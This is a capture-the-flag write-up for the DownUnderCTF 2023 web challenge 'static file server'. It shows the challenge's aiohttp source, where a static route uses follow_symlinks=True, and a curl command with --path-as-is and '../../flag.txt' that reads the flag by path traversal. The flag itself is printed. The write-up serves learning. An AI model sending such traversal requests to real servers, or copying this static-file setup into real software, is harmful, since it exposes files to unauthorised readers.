# DownUnderCTF 2023

## static file server

> Here's a simple Python app that lets you view some files on the server.
>
>  Author: joseph
>
> [`static-file-server.zip`](static-file-server.zip)

Tags: _web_

## Solution
For this challenge we are provided with the source code of another simple web application.

```python
from aiohttp import web

async def index(request):
    return web.Response(body='''
        <header><h1>static file server</h1></header>
        Here are some files:
        <ul>
            <li><img src="/files/ductf.png"></img></li>
            <li><a href="/files/not_the_flag.txt">not the flag</a></li>
        </ul>
    ''', content_type='text/html', status=200)

app = web.Application()
app.add_routes([
    web.get('/', index),

    # this is handled by https://github.com/aio-libs/aiohttp/blob/v3.8.5/aiohttp/web_urldispatcher.py#L654-L690
    web.static('/files', './files', follow_symlinks=True)
])
web.run_app(app)
```

To implement static file handling the app uses [`aiohttp static route`](https://docs.aiohttp.org/en/v3.8.1/web_advanced.html#static-file-handling) which allows path traversal:

```bash
$ curl https://web-static-file-server-9af22c2b5640.2023.ductf.dev/files/../../flag.txt --path-as-is
DUCTF{../../../p4th/tr4v3rsal/as/a/s3rv1c3}
```

Flag `DUCTF{../../../p4th/tr4v3rsal/as/a/s3rv1c3}`